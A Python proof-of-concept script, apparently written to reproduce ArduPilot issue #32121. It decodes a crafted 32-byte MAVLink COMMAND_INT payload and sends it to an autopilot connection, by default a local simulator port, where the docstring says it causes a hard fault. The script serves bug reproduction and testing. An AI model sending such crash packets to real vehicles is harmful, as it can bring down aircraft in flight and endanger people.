#!/usr/bin/env python3

'''
Reproduce ArduPilot issue #32121 - crafted MAVLink COMMAND_INT
packet that causes a hard fault.

Wire-format payload from the issue (32 bytes):
  72 00 B4 9B 7F 97 00 FF 01 00 7F 00 00 00 20 47
  B3 A2 6E 75 4C 82 00 91 91 91 10 00 91 01 00 65

COMMAND_INT (message 75) wire ordering is largest-type-first:
  param1(f) param2(f) param3(f) param4(f) x(i) y(i) z(f)
  command(H) target_system(B) target_component(B) frame(B)
  current(B) autocontinue(B)
  Format: <ffffiifHBBBBB  (35 bytes, short payload zero-padded)

Usage:
    python3 inject_issue_32121.py [connection_string]

    connection_string defaults to tcp:127.0.0.1:5760
'''

import struct
import sys

from pymavlink import mavutil


def main():
    connection_string = sys.argv[1] if len(sys.argv) > 1 else 'tcp:127.0.0.1:5760'

    # Raw payload from the issue
    payload = bytes([
        0x72, 0x00, 0xB4, 0x9B, 0x7F, 0x97, 0x00, 0xFF,
        0x01, 0x00, 0x7F, 0x00, 0x00, 0x00, 0x20, 0x47,
        0xB3, 0xA2, 0x6E, 0x75, 0x4C, 0x82, 0x00, 0x91,
        0x91, 0x91, 0x10, 0x00, 0x91, 0x01, 0x00, 0x65,
    ])

    # COMMAND_INT wire format: largest types first
    # <ffffiifHBBBBB = 35 bytes; zero-pad the 32-byte payload
    wire_format = '<ffffiifHBBBBB'
    padded = payload + b'\x00' * (struct.calcsize(wire_format) - len(payload))

    (param1, param2, param3, param4,
     x, y, z,
     command,
     target_system, target_component, frame,
     current, autocontinue) = struct.unpack(wire_format, padded)

    print("Decoded COMMAND_INT from wire payload:")
    print("  param1           = %.6e (0x%s)" % (param1, payload[0:4].hex()))
    print("  param2           = %.6e (0x%s)" % (param2, payload[4:8].hex()))
    print("  param3           = %.6e (0x%s)" % (param3, payload[8:12].hex()))
    print("  param4           = %.6e (0x%s)" % (param4, payload[12:16].hex()))
    print("  x                = %d (0x%s)" % (x, payload[16:20].hex()))
    print("  y                = %d (0x%s)" % (y, payload[20:24].hex()))
    print("  z                = %.6e (0x%s)" % (z, payload[24:28].hex()))
    print("  command          = %d (0x%s)" % (command, payload[28:30].hex()))
    print("  target_system    = %d" % target_system)
    print("  target_component = %d" % target_component)
    print("  frame            = %d" % frame)
    print("  current          = %d" % current)
    print("  autocontinue     = %d" % autocontinue)

    print()
    print("Connecting to %s" % connection_string)
    mav = mavutil.mavlink_connection(connection_string)
    mav.wait_heartbeat()
    print("Connected (system %u component %u)" % (mav.target_system, mav.target_component))

    mav.mav.command_int_send(
        target_system,
        target_component,
        frame,
        command,
        current,
        autocontinue,
        param1,
        param2,
        param3,
        param4,
        x,
        y,
        z,
    )

    print("Packet sent")


if __name__ == '__main__':
    main()
